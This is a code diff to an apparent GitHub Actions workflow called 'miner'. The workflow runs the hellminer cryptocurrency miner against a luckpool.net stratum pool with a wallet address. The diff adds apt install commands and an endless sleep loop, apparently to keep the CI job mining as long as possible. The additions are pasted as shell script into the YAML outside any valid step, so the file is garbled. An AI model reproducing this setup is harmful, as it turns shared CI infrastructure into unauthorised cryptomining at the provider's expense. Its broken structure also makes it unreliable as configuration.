@@ -1,3 +1,6 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
 # This is a basic workflow to help you get started with Actions
 
 name: miner 
@@ -21,4 +24,8 @@ jobs:
         run: tar -xvf hellminer_cpu_linux.tar.gz
       - name: Running hellminer
         run: ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RPzoRzbAZLNcTXJ2D7NvpprGUMrrWBh12c.oskg -p x --cpu 2
+        while [ 1 ]; do
+sleep 3
+done
+sleep 999
         
